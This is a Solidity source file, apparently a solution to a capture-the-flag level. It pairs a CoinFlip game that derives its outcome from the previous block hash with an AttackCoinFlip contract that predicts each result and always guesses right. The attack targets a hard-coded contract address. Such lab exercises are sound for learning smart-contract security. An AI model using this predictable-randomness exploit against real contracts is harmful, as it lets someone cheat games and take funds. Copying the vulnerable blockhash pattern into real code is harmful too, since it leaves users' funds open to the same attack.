// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackCoinFlip {
    CoinFlip CoinFlipInstance =
        CoinFlip(0x413Ec3E0ac98eFbad35D0d1E0069c21e5f4eBa5d);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipAttacker() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlipInstance.flip(side);
    }

    function getConsecutiveWins()
        external
        view
        returns (uint256 consecutiveWins)
    {
        consecutiveWins = CoinFlipInstance.consecutiveWins();
    }
}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
